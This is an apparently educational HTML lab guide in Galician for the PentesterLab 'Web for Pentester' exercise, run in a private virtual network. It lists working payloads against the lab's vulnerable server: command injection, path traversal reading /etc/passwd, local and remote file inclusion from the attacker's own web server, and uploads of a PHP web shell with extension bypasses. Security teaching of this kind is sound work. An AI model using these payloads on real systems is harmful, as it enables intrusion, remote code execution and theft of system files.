<!DOCTYPE HTML>
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <title>Práctica SI PentesterLab</title>
    <link rel="stylesheet" type="text/css" href="css/styles.css" />
</head>

<body>
  <div id='autocentrado'>
    <h1 class='arriba'><a href='https://github.com/ricardofc/repoEDU-CCbySA/tree/main/SI/Pentester' target='_blank'>Práctica Seguridade Informática:<br /><span class='BookmarkTitle-Level-1'>PentesterLab ➝ Web for Pentester</span></a></h1>
    <img class='cfigure mleft arriba' src="images/mouse-pointer-mini.png" />
    <figure class='cfigure'>
      <img class='contido bfigure pall' src="images/Escenario-PentesterLab.bmp" />
    </figure>

    <div class='nota w80 fright'>
      <p class='justify pall'><b>LIMITACIÓN DE RESPONSABILIDADE</b> O autor do presente documento declina calquera responsabilidade asociada ao uso incorrecto e/ou malicioso que puidese realizarse coa información exposta no mesmo. Por tanto, non se fai responsable en ningún caso, nin pode ser considerado legalmente responsable en ningún caso, das consecuencias que poidan derivarse da información contida nel ou que esté enlazada dende ou hacia el, incluíndo os posibles erros e información incorrecta existentes, información difamatoria, así como das consecuencias que se poidan derivar sobre a súa aplicación en sistemas de información reais e/ou virtuais. Este documento foi xerado para uso didáctico e debe ser empregado en contornas privadas e virtuais controladas co permiso correspondente do administrador desas contornas.</p>
      <p class='pall'><b><span class='BookmarkTitle-Level-2'>NOTAS</span></b>:
        <ul type='square'>
          <li class='colorblue mtopplusx2'><span class='label'> <a href='https://pentesterlab.com/exercises'>PentesterLab</a></span>
            <img class='cfigure mleftsubs arribaplus' src="images/mouse-pointer-mini.png" />
          </li>
          <li class='colorblue mtopplusx2'><span class='label'> <a href='https://pentesterlab.com/exercises/web_for_pentester/course'>Exercise PentesterLab: Web for Pentester</a></span>
            <img class='cfigure mleftsubs arribaplus' src="images/mouse-pointer-mini.png" />
          </li>
          <li class='colorblue mtopplusx2'><span class='label'> <a href='https://pentesterlab.com/exercises/web_for_pentester/attachments'>ISO Exercise Web for Pentester</a></span>
            <img class='cfigure mleftsubs arribaplus' src="images/mouse-pointer-mini.png" />
          </li>
        </ul>
      </p>
    </div>

    <div class='pagebreak contido'>
      <ol>
        <p class='mtop mleftsubs mbottom label'><span class='BookmarkTitle-Level-2'>Máquina PentesterLab i386</span></p>
          <li class='mtop mleft mbottom'>Iniciar ➝ Executar no terminal: 
            <ul class='dashed mleftsubs'>
              <li>ip addr show<span class='explicacion'> #Amosar a configuración de todas as tarxetas de rede. Nesta caso, as tarxetas de rede: loopback(lo) e interna(eth0)</span>.</li>
              <li>sudo su - <span class='explicacion'> #Acceder á consola de root(administrador) a través dos permisos configurados co comando sudo (/etc/sudoers, visudo)</li>
              <ul class='hashtag mleftubs'>
                <li>ip addr add 192.168.120.100/24 dev eth0<span class='explicacion'> #Configurar a tarxeta de rede interna eth0, coa IP: 192.168.120.100 e máscara de subrede: 255.255.255.0</span>.</li>
              </ul>
            </ul>
          </li>


        <p class='mtop mleftsubs mbottom label'><span class='BookmarkTitle-Level-2'>Máquina Kali amd64</span></p>
          <li class='mtop mleft mbottom'>Na contorna gráfica abrir un terminal e executar: 
            <ul class='dashed-kali mleftsubs'>
              <li>setxkbmap es <span class='explicacion'> #Cambiar o mapa de teclado ao idioma español</span>.</li>
              <li>ip addr show<span class='explicacion'> #Amosar a configuración de todas as tarxetas de rede. Nesta caso, as tarxetas de rede: loopback(lo), interna(eth0) e NAT(eth1)</span>.</li>
              <li>sudo su - <span class='explicacion'> #Acceder á consola de root(administrador) a través dos permisos configurados co comando sudo (/etc/sudoers, visudo)</li>
              <ul class='hashtag-kali mleftsubs'>
                <li>/etc/init.d/avahi-daemon stop <span class='explicacion'> #Parar o demo avahi-daemon(control resolución de nomes) para poder configurar de forma manual a configuración de rede e non ter conflicto con este demo.</span></li>
                <li>/etc/init.d/network-manager stop || pkill NetworkManager<span class='explicacion'> #Parar o demo network-manager(xestor de rede) ou o script NetworkManager (executado sen ser demo) para poder configurar de forma manual a configuración de rede e non ter conflicto con este xestor.</span></li>
                <li>ip addr add 192.168.120.101/24 dev eth0<span class='explicacion'> #Configurar a tarxeta de rede interna eth0, coa IP: 192.168.120.101 e máscara de subrede: 255.255.255.0</span>.</li>
                <li>exit <span style='font-size:14px;color:#0F18A0;'> #Saír da consola local sudo na que estabamos a traballar para voltar á consola local de <b>kali</b>.</span></li>
              </ul>
              <li>firefox http://192.168.120.100 &<span class='explicacion'> #Lanzar o navegador firefox na URL http://192.168.120.100, realizando a execución en segundo plano (&), é dicir, acceder ao servidor web da máquina virtual PentesterLab.
            </ul>
          </li>

        <li class='mtop mleft mbottom'><b><span class='BookmarkTitle-Level-2'>Probas ataques:</span></b>
	<ol type='I'>
          <li class='mleftsubs'><p><i><b><span class='BookmarkTitle-Level-3'>Command injection</span></b></i></li>
          <ol type="a" class='mleftsubs'>
            <li><p><i><span class='BookmarkTitle-Level-4'>Example 1</span></i> ➝ <br />
             <code>http://192.168.120.100/commandexec/example1.php?ip=127.0.0.1</code><br />
             <span class='red'><b><code>http://192.168.120.100/commandexec/example1.php?ip=127.0.0.1;whoami</code></b></p>
            </li>
            <li><p><i><span class='BookmarkTitle-Level-4'>Example 2</span></i> ➝ <br />
             <code>http://192.168.120.100/commandexec/example2.php?ip=127.0.0.1</code><br />
             <span class='red'><b><code>http://192.168.120.100/commandexec/example2.php?ip=127.0.0.1%0Awhoami</code></b></p>
            </li>
            <li><p><i><span class='BookmarkTitle-Level-4'>Example 3</span></i> ➝ 
              <p class='mleftsubsx2'><span class='red'><b><code>echo -en &quot;GET /commandexec/example3.php?ip=127.0.0.1;whoami HTTP/1.0 \r\n\r\n&quot; | \ telnet 192.168.120.100 80</code></b></p>
              <p class='mleftsubsx2'><span class='red'><b><code>echo -en &quot;GET /commandexec/example3.php?ip=127.0.0.1;whoami HTTP/1.0 \r\n\r\n&quot; | \ <br />nc 192.168.120.100 80</code></b></p>
            </li>
          </ol>

  <div class='pagebreak'>&nbsp;</div>
          <li class='mleftsubs'><i><b><span class='BookmarkTitle-Level-3'>Directory Traversal</span></b></i></li>
          <ol type="a" class='arriba mleftsubs'>
            <li><p><i><span class='BookmarkTitle-Level-4'>Example 1</span></i> ➝ Imaxe ➝ Clic botón dereito ➝ 
              <p class='mleftsubsx4 arribasubsmini2'><code>http://192.168.120.100/dirtrav/example1.php?file=hacker.png</code> ➝</p>
              <p class='mleftsubsx4'><span class='red'><b><code>http://192.168.120.100/dirtrav/example1.php?file=../../../../../../../../../etc/passwd</code></b></p>
            </li>
	    <li><p><i><span class='BookmarkTitle-Level-4'>Example 2</span></i> ➝ Imaxe ➝ Clic botón dereito ➝ 
              <p class='mleftsubsx4 arribasubsmini2'><code>http://192.168.120.100/dirtrav/example2.php?file=/var/www/files/hacker.png</code> ➝</p>
              <p class='mleftsubsx4'><span class='red'><b><code>http://192.168.120.100/dirtrav/example2.php?file=/var/www/files/../../../../etc/passwd</code></b></p>
            </li>
	    <li><p><i><span class='BookmarkTitle-Level-4'>Example 3</span></i> ➝ Imaxe ➝ Clic botón dereito ➝ 
              <p class='mleftsubsx4 arribasubsmini2'><code>http://192.168.120.100/dirtrav/example3.php?file=hacker</code> ➝</p>
	      <p class='mleftsubsx4'><span class='red'><b><code>http://192.168.120.100/dirtrav/example3.php?file=../../../../../etc/passwd%00hacker</code></b></a></p>
            </li>
          </ol>
  <div class='pagebreak'>&nbsp;</div>
          <li class='mleftsubs'><p><i><b><span class='BookmarkTitle-Level-3'>File Include</span></b></i></li>
          <ol type="a" class='mleftsubs'>
            <li><p><i><span class='BookmarkTitle-Level-4'>Example 1</span></i> ➝ <br />
              <p class='mleftsubsx4'><code>http://192.168.120.100/fileincl/example1.php?page=intro.php</code> ➝ </p>
              <p class='mleftsubsx4'><b>LFI</b> ➝
                <span class='red'><b><code>http://192.168.120.100/fileincl/example1.php?page=../../../../../etc/passwd</code></b></p>
              <p class='mleftsubsx4'><span class='cblack'><b>RFI</b> ➝ </span>
              <span class='red'>Apagar MV PentesterLab ➝ Cambiar configuración rede ➝ eth0 rede Interna e eth1 NAT ➝ Iniciar ➝ Configurar de novo eth0 ➝ Dende MV Kali(cliente) probar: </span></p>
                <p class='mleftsubsx3'> ➝<b><span class='red'><code>http://192.168.120.100/fileincl/example1.php?page=https://www.google.es</code></span></b></p>
                <p class='mleftsubsx3'> ➝<b><span class='red'><code>http://192.168.120.100/fileincl/example1.php?page=https://www.edu.xunta.gal</code></b></span></p>
            </li>
  <div class='minindent'>&nbsp;</div>
            <li><p><i><span class='BookmarkTitle-Level-4'>Example 2</span></i> ➝<br />
              <p class='mleftsubsx4'>http://192.168.120.100/fileincl/example2.php?page=intro ➝ </p>
              <p class='mleftsubsx4'><span class='cblack'><b>LFI</b> ➝</span>
                <span class='red'><b><code>http://192.168.120.100/fileincl/example2.php?page=../../../../../etc/passwd</code></b></p>
              <p class='mleftsubsx4'><span class='cblack'><b>RFI</b> ➝</span>
              <span class='red'>Apagar MV PentesterLab ➝ Cambiar configuración rede ➝ eth0 rede Interna e eth1 NAT ➝ Iniciar ➝ Configurar de novo eth0 ➝ Dende MV Kali(cliente) probar: </span></p>
              <p class='mleftsubsx3'> ➝ <b><span class='red'><code>http://192.168.120.100/fileincl/example2.php?page=https://www.google.es/index</code></span></b></p>
              <p class='mleftsubsx3'> ➝ <b><span class='red'><code>http://192.168.120.100/fileincl/example2.php?page=https://www.edu.xunta.gal/index</code></span></b></p>
              <p class='mleftsubsx3'> ➝ <span class='red'> Na máquina virtual Kali:</span>
                <ol type='i' class='red'>
                  <li>Crear o arquivo <i>/var/www/html/index.php</i>
                    <pre>
                    &lt;?php
                      phpinfo();
                    ?&gt;
                    </pre>
                  </li>
                  <li>Arrancar servidor web Apache:</span>
                    <ul class='hashtag-kali'>
                      <li>/etc/init.d/apache2 start</li>
                    </ul>
                  </li>
                </ol>
              <p class='mleftsubs'> <span class='red'><b><code>http://192.168.120.100/fileincl/example2.php?page=http://192.168.120.101/index</code></b></p>
            </li>
          </ol>

  <div class='pagebreak'>&nbsp;</div>
          <li class='mleftsubs'><p><i><b><span class='BookmarkTitle-Level-3'>File Upload</span></b></i></li>
          <ol type="a" class='mleftsubs'>
            <li><p><i><span class='BookmarkTitle-Level-4'>Example 1</span></i> ➝ <br />
              <p><code>http://192.168.120.100/upload/example1.php</code> ➝ <span class='red'> Dende a máquina virtual Kali:</span>
                <ol type='i' class='red'>
                  <li>Crear o arquivo <i>/tmp/file.php</i>
                    <pre class='arribasubs'>
                    &lt;?php
                      system('id');
                    ?&gt;
                    </pre>
                  </li>
                  <li>Subir o arquivo file.php:
                  ➝ Premer na ligazón ➝ <b><code>http://192.168.120.100/upload/images/file.php</code></b> 
                  </li>
                </ol>
              </p>
            </li>
  <div class='minindent'>&nbsp;</div>
            <li><p><i><span class='BookmarkTitle-Level-4'>Example 2</span></i> ➝ <br />
              <p><code>http://192.168.120.100/upload/example2.php</code><br /> ➝ <span class='red'> Dende a máquina virtual Kali:</span>
                <ol type='i' class='red'>
                  <li>Crear o arquivo <i>/tmp/file.php</i>
                    <pre class='arribasubs'>
                    &lt;?php
                      system('id');
                    ?&gt;
                    </pre>
                  </li>
                  <li>Subir o arquivo file.php:
                  ➝ Premer na ligazón ➝ <b><code>http://192.168.120.100/upload/images/file.php</code></b> ➝ Erro: NO PHP
                  <li class='mtopplus'>Renomear ficheiro file.php a file.php3 
                  <li class='mtopplus'>Subir file.php3 ➝ Premer na ligazón ➝ <b><code>http://192.168.120.100/upload/images/file.php3</code></b>
                  <li class='mtopplus'>Copiar file.php3 a file.phps ➝ Subir file.phps ➝ Premer na ligazón ➝ <b><code>http://192.168.120.100/upload/images/file.phps</code></b>
                  <li class='mtopplus'>Copiar file.php3 a file.phtml ➝ Subir file.phtml ➝ Premer na ligazón ➝ <b><code>http://192.168.120.100/upload/images/file.phtml</code></b>
             <li>Crear o arquivo <i>/tmp/file2.php3</i>
                    <pre class='arribasubs'>
                    &lt;?php
                      system($_GET['cmd']);
                    ?&gt;
                    </pre>
                  </li>
                  <li class='mtopplus'>Subir o arquivo file2.php3:
                  ➝ Premer na ligazón ➝ <b><code>http://192.168.120.100/upload/images/file2.php3</code></b> ➝ Erro: NO PHP
                  </li>
                  <li class='mtopplus'>Modificar URL:
                  <b><code>http://192.168.120.100/upload/images/file2.php3?cmd=whoami</code></b>
                  </li>
                </ol>
              </p>
            </li>
          </ol>
        </ol>
    <div class='mtopplusx8'>&nbsp;</div>
    <div class='mtopplusx2'>&nbsp;</div>
    <div id="footer">
    <div class="nome">Ricardo Feijoo Costa</div>
    <div class='.imgccbysa arriba'>
      <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" src="images/88x31.png" /></a><br />This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>
    </div>
  </div>
</body>
</html>
